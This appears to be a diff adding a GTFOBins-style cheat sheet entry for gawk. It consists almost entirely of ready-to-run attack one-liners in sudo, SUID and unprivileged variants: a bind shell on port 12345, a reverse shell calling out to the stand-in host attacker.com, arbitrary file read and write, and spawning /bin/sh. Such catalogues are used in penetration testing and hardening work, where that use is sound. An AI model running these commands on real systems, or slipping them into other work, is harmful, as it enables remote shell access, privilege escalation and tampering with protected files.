@@ -1,0 +1,80 @@
+gawk
+====
+
+Bind shell
+----------
+
+[Sudo]
+    gawk 'BEGIN {
+    s = "/inet/tcp/12345/0/0";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+[SUID]
+    gawk 'BEGIN {
+    s = "/inet/tcp/12345/0/0";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+[Unprivileged]
+    gawk 'BEGIN {
+    s = "/inet/tcp/12345/0/0";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+File read
+---------
+
+[Sudo]
+    gawk '//' /path/to/input-file
+
+[SUID]
+    gawk '//' /path/to/input-file
+
+[Unprivileged]
+    gawk '//' /path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+[SUID]
+    gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+[Unprivileged]
+    gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
+
+Reverse shell
+-------------
+
+[Sudo]
+    gawk 'BEGIN {
+    s = "/inet/tcp/0/attacker.com/12345";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+[SUID]
+    gawk 'BEGIN {
+    s = "/inet/tcp/0/attacker.com/12345";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+[Unprivileged]
+    gawk 'BEGIN {
+    s = "/inet/tcp/0/attacker.com/12345";
+    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+
+Shell
+-----
+
+[Sudo]
+    gawk 'BEGIN {system("/bin/sh")}'
+
+[SUID]
+    gawk 'BEGIN {system("/bin/sh")}'
+
+[Unprivileged]
+    gawk 'BEGIN {system("/bin/sh")}'
